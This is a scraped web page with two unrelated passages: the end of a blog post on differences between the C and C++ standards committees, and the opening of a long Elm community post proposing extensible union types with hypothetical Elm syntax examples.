In fact, if the room invites you to “talk to the C committee”, it is likely your proposal is dead, even in the unlikely event that no one in the room was against it.</p>
<p>Another likely scenario is that the C committee accepts a version of a proposal that is slightly different from what exists in C++.
<code>true</code>? Let’s make that a macro. <code>char16_t</code> ? Let’s make that a typedef. <code>char32_t</code>? Not necessarily UTF-32. <code>static_assert</code> ? <code>_Static_assert</code>.</p>
<p>The list goes on. Should we blame C? Probably not. Their committee does what they think is best for their language.
The opposite is true too. In C++20 designated initializers were inspired by C’s but are slightly different because they would otherwise not fit with the C++ initialization rules.</p>
<p>I am part of the problem. C has VLAs. I would vote against a proposal to adopt that in standard C++, <a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=Linux-Kills-The-VLA">too many security issues</a>. A proposal to add <code>_Generic</code> to C++ would be over-my-dead-body. I am not sure if <code>_Generic</code> attempts to palliate to the lack of template or the lack of overloads, but C++ has both these features - from my point of view <code>_Generic</code> doesn’t fit into the big picture of what I imagine C++ to be.</p>
<p>Both committees seem also inconsistent in how much they care about the other language.
Sometimes we go to great lenghts (<a href="https://en.cppreference.com/w/cpp/numeric/complex">std::complex</a>), sometimes we don’t care at all (<a href="https://en.cppreference.com/w/c/language/array">static array parameters</a>).</p>
<p>There is no way around this. Don’t forget that each committee is a bunch of people
voting at different times in different rooms and trying to control the outcome would defeat the purpose
of having a vote.
Putting people in the same room is not realistic either. ISO might object and the participation inbalance
would put C people at an enormous disadvantage.</p>
<h2 id="c-compatibility-doesnt-matter-kinda">C compatibility doesn’t matter, kinda</h2>
<p>If you are a C developer, I imagine you see C as a neat programming language.
But for the rest of us, C is something else.</p>
<p>C is the universal, cross-language glue that ties it all together.</p>
<p>For C++ users, C is …</p></div></div>

<p>This is an exploratory post of what extensible unions (a.k.a. polymorphic variants) might look like in Elm. This mainly a post to plant a seed in the minds of the collective Elm community and is not a call to action that they need to be implemented in Elm (although I would really really really love if they were).</p>
<p>One-line headline: I think extensible unions not only fill in a missing abstract corner of Elm’s type system (rather than being a entirely novel extension to its type system), but also solve many real-world problems affecting Elm codebases today, all without compromising and indeed augmenting the Elm compiler’s excellent way of guiding users through refactors.</p>
<p>This post is jumping off a separate post <a href="https://discourse.elm-lang.org/t/how-to-represent-many-subsets-of-an-enum/6088/22">here</a> with some folks who were interested in a deeper explanation of extensible unions/polymorphic variants.</p>
<p>This post ended up being <strong>really</strong> long, so I apologize for its length in advance, but I do hope that people find it useful.</p>
<p>Because of its length I’ll just lead off with a high-level summary.</p>
<p>Polymorphic variants or extensible union types are to normal Elm union types (e.g.&nbsp;<code>type MyUnionType = UnionVariant0 | UnionVariant1 | UnionVariant2</code>) what records and extensible records are to normal Elm product types (e.g.&nbsp;<code>type MyProductType = ProductType TypeOfElement0 TypeOfElement1 TypeOfElement2</code>).</p>
<p>As such they allow for many of the same benefits that records and extensible records bring to input types of functions and modularizing Elm models, to output types of functions and modularizing Elm messages and update functions.</p>
<p>This post is split up into the following sections:</p>
<ul>
<li><a href="#what-are-extensible-union-types">What are extensible union types</a>: A introduction to some pseudo-Elm to help familiarize people with what extensible unions are. If you already know what extensible unions/polymorphic variants are you can skip this. <strong>The crucial take away is that we already have the equivalent of extensible unions for products, i.e.&nbsp;extensible records. This is just filling in a hole for current union types.</strong></li>
<li><a href="#what-are-the-benefits-of-extensible-unions">What are the benefits of extensible unions (the basics)</a>: Walking through some basic, contrived cases where extensible unions can come in handy.</li>
<li><a href="#everyday-elm-cases">Everyday Elm cases</a>: A non-exhaustive list of case studies of where extensible unions can help in code you’re likely to see in real Elm codebases.
<ul>
<li>Reminding you when you forget certain output cases for decoding</li>
<li>Unifying different error types</li>
<li>Modular Elm code: Unifying NoMap, OutMsg, and Translator</li>
</ul></li>
<li><a href="#drawbacks">Drawbacks and things-you-might-think-are-drawbacks-but-aren’t (a.k.a. literature review of other implementations)</a>: A dive into some cons and not-really-cons of extensible unions as well as how they’re implemented in other languages (mainly OCaml).</li>
</ul>

<p>Let’s begin with a very short primer on union (a.k.a. sum types) and product types. We’ll approach them individually even though in Elm we can mix and match them together in a single type declaration. This hopefully will make some of the later presentation of extensible union types a little easier to follow.</p>
<p>Union types are those types that express an “or” relationship among its type constructors.</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a><span>-- MyColor is Red *or* Green *or* Blue</span></span>
<span id="cb1-2"><a href="#cb1-2"></a><span>type</span> <span>MyColor</span> <span>=</span> <span>Red</span> <span>|</span> <span>Green</span> <span>|</span> <span>Blue</span></span></code></pre></div>
<p>Product types are those types that express an “and” relationship in its (single) type constructor.</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>-- MyUserType is a MyUser that consists of a String *and* another String (maybe</span></span>
<span id="cb2-2"><a href="#cb2-2"></a><span>-- a first and last name)</span></span>
<span id="cb2-3"><a href="#cb2-3"></a><span>type</span> <span>MyUserType</span> <span>=</span> <span>MyUser</span> <span>String</span> <span>String</span></span></code></pre></div>
<p>These two kinds of types are dual, i.e.&nbsp;complements, to one another, where you’ll see each of them playing “opposite” roles in a lot of circumstances. We’ve already seen one example here, whereas a union type can have multiple type constructors, only one of which can be used at any given time for a single value (i.e.&nbsp;only one of <code>Red</code>, <code>Green</code>, or <code>Blue</code> can be in use for a single value of type <code>MyColor</code>), a product type has a single constructor with multiple fields, all of which must be filled in for a single value (for any value of <code>MyUserType</code> both strings must be provided to <code>MyUser</code>). Notice the inverted relationship between multiple and single between the two (i.e. multiple type constructors vs single type constructor and single variant in use vs multiple fields must all be filled in). This sort of “dual” inversion will show up a lot more later on.</p>
<p>Even though the two are complements to one another, statically typed programming languages in general seem to favor product types over union types. You see this with languages like Java that allow for the creation of product types (i.e.&nbsp;Java classes), but have no union types. Statically typed FP languages such as Elm address this imbalance by also allowing union types. This unlocks a host of data modeling goodies and is the core of how Elm allows us to create “correct by construction” models that make errors unrepresentable.</p>
<p>Elm, however, goes further than some other statically typed FP languages and bestows more power to product types through record types and extensible record types. These essentially are product types on steroids. To see that records are fundamentally product types, note that you could in theory replace every record type with a product type, it’d just make for really annoying code because all of a sudden your fields are all anonymous and position-based.</p>
<p>However, Elm, in a fashion that somewhat echoes Java’s choice to disadvantage union types, doesn’t provide equivalent power to union types. The rest of this post is an exploration in what that might look like if Elm did.</p>
<p>To understand the relationship between extensible union types and normal union types, it’s perhaps illuminating to first consider the relationship between record types and normal product types.</p>
<p>Notice that Elm records differ from Elm’s normal product types by being</p>
<ol type="1">
<li>Structural: Normal product types in Elm are nominal, that is name-based. Every product type you use must have been declared somewhere and is given an explicit, unique name that is used for typechecking. On the other hand record types are anonymous. Though they can be given a name with <code>type alias</code> that name is non-canonical (the same record type can be given multiple different names) and plays no role in typechecking. In other words <em>the structure of a record type is all that matters to the type checker, not its name.</em></li>
<li>Extensible: Normal product type signatures must specify all possible fields it supports. Extensible records only need to specify a subset of fields and then leave the others unspecified.</li>
</ol>
<p>Just to make this clear, here are the three versions of a product type that Elm supports at the current moment.</p>
<div id="cb3"><pre><code><span id="cb3-1"><a href="#cb3-1"></a><span>-- Normal Elm product type</span></span>
<span id="cb3-2"><a href="#cb3-2"></a><span>type</span> <span>SomeProductType</span> <span>=</span> <span>ProductTypeConstructor</span> <span>Int</span> <span>String</span></span>
<span id="cb3-3"><a href="#cb3-3"></a></span>
<span id="cb3-4"><a href="#cb3-4"></a><span>-- Normal Elm record, notice the type alias rather than type</span></span>
<span id="cb3-5"><a href="#cb3-5"></a><span>type</span> <span>alias</span> <span>SomeRecord</span> <span>=</span> { <span>field0</span> : <span>Int</span><span>,</span> <span>field1</span> : <span>String</span> }</span>
<span id="cb3-6"><a href="#cb3-6"></a></span>
<span id="cb3-7"><a href="#cb3-7"></a><span>-- Extensible Elm record, notice the type variable</span></span>
<span id="cb3-8"><a href="#cb3-8"></a><span>type</span> <span>alias</span> <span>ExtensibleRecord</span> <span>a</span> <span>=</span> { <span>a</span> <span>|</span> <span>field0</span> : <span>Int</span><span>,</span> <span>field1</span> : <span>String</span> }</span></code></pre></div>
<p>Extensible union types introduce these two features, namely making a type structural and extensible, to union types. I find actual code to often be hepful here, so I’m going to introduce some hypothetical Elm syntax here.</p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span>-- Normal Elm sum type</span></span>
<span id="cb4-2"><a href="#cb4-2"></a><span>type</span> <span>User0</span> <span>=</span> <span>RegularUser</span> <span>Int</span> <span>|</span> <span>AdminUser</span> <span>String</span></span>
<span id="cb4-3"><a href="#cb4-3"></a></span>
<span id="cb4-4"><a href="#cb4-4"></a><span>-- Hypothetical extensible union type, again note that this is a type alias</span></span>
<span id="cb4-5"><a href="#cb4-5"></a><span>type</span> <span>alias</span> <span>User1</span> <span>=</span> <span>@</span><span>RegularUser</span> <span>Int</span> <span>or</span> <span>@</span><span>AdminUser</span> <span>String</span></span>
<span id="cb4-6"><a href="#cb4-6"></a></span>
<span id="cb4-7"><a href="#cb4-7"></a><span>-- Hypothetical extensible union type actually using the extensible portion,</span></span>
<span id="cb4-8"><a href="#cb4-8"></a><span>-- note the type variable</span></span>
<span id="cb4-9"><a href="#cb4-9"></a><span>type</span> <span>alias</span> <span>User2</span> <span>a</span> <span>=</span> <span>a</span> <span>or</span> <span>@</span><span>RegularUser</span> <span>Int</span> <span>or</span> <span>@</span><span>AdminUser</span> <span>String</span></span></code></pre></div>
<p>Let’s go over <code>User1</code> and <code>User2</code> in more detail. Names prefixed with a an <code>@</code> symbol such as <code>@RegularUser</code> are extensible union tags. These play an analogous role to field names in a record type. That is <code>@RegularUser Int</code> is an independent type in the same way <code>{ field0 : Int }</code> is an independent type, rather than just a value like <code>RegularUser Int</code>.</p>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a><span>@</span><span>SomeVariantTag</span> <span>MyType</span></span>
<span id="cb5-2"><a href="#cb5-2"></a><span>^</span> <span>tag</span> <span>name</span>      <span>^</span> <span>tagged</span> <span>type</span></span>
<span id="cb5-3"><a href="#cb5-3"></a></span>
<span id="cb5-4"><a href="#cb5-4"></a>{ <span>recordField</span> : <span>MyType</span> }</span>
<span id="cb5-5"><a href="#cb5-5"></a>  <span>^</span> <span>tag</span> <span>name</span>    <span>^</span> <span>tagged</span> <span>type</span></span></code></pre></div>
<p>Likewise, just like record field names can be used as the value level to directly create a value, extensible union tags can be used at the value level to directly create a value.</p>
<div id="cb6"><pre><code><span id="cb6-1"><a href="#cb6-1"></a><span>someRegularUser</span> : <span>User1</span></span>
<span id="cb6-2"><a href="#cb6-2"></a><span>-- Equivalently</span></span>
<span id="cb6-3"><a href="#cb6-3"></a><span>-- someRegularUser : @RegularUser Int or @AdminUser String</span></span>
<span id="cb6-4"><a href="#cb6-4"></a><span>-- or</span></span>
<span id="cb6-5"><a href="#cb6-5"></a><span>-- someRegularUser : @AdminUser String or @RegularUser Int</span></span>
<span id="cb6-6"><a href="#cb6-6"></a><span>-- Notice just like for record fields the order doesn't matter</span></span>
<span id="cb6-7"><a href="#cb6-7"></a><span>-- This is different from a normal sum type where Result String Int is</span></span>
<span id="cb6-8"><a href="#cb6-8"></a><span>-- different from Result Int String</span></span>
<span id="cb6-9"><a href="#cb6-9"></a><span>someRegularUser</span> <span>=</span> <span>@</span><span>RegularUser</span> <span>0</span></span></code></pre></div>
<p>Now we could also have assigned this type</p>
<div id="cb7"><pre><code><span id="cb7-1"><a href="#cb7-1"></a><span>someOtherRegularUser</span> : <span>@</span><span>RegularUser</span> <span>Int</span></span>
<span id="cb7-2"><a href="#cb7-2"></a><span>someOtherRegularUser</span> <span>=</span> <span>@</span><span>RegularUser</span> <span>0</span></span></code></pre></div>
<p>or</p>
<div id="cb8"><pre><code><span id="cb8-1"><a href="#cb8-1"></a><span>lotsOfIrrelevantVariants</span> : <span>@</span><span>Blah</span> <span>String</span> <span>or</span> <span>@</span><span>Blahblah</span> <span>Bool</span> <span>or</span> <span>@</span><span>RegularUser</span> <span>Int</span></span>
<span id="cb8-2"><a href="#cb8-2"></a><span>lotsOfIrrelevantVariants</span> <span>=</span> <span>@</span><span>RegularUser</span> <span>0</span></span></code></pre></div>
<p>For now let’s leave aside why all these type signatures work other than to hand-wave it and say they all make sense if you think of “or”. We’ll return to that in just a bit when we look close at extensible types. Instead, let’s look at how to actually work with extensible unions.</p>
<p>Fundamentally the only thing you can do with a product type is pull out its fields. On the flip side, fundamentally the only thing you can do with a union type is pattern match on its variants with a case statement.</p>
<p>This remains true for extensible unions, which have their own associated case statement for pattern matching on them, introduced by <code>case#</code> instead of <code>case</code> (you could unify them as a single <code>case</code> statement, but I’m separating them for clarity here).</p>
<div id="cb9"><pre><code><span id="cb9-1"><a href="#cb9-1"></a><span>toInt</span> : <span>@</span><span>RegularUser</span> <span>Int</span> <span>or</span> <span>@</span><span>AdminUser</span> <span>String</span> <span>-&gt;</span> <span>Int</span></span>
<span id="cb9-2"><a href="#cb9-2"></a><span>toInt</span> <span>user</span> <span>=</span> <span>case</span><span>#</span> <span>user</span> <span>of</span></span>
<span id="cb9-3"><a href="#cb9-3"></a>    <span>@</span><span>RegularUser</span> <span>x</span> <span>-&gt;</span> <span>x</span></span>
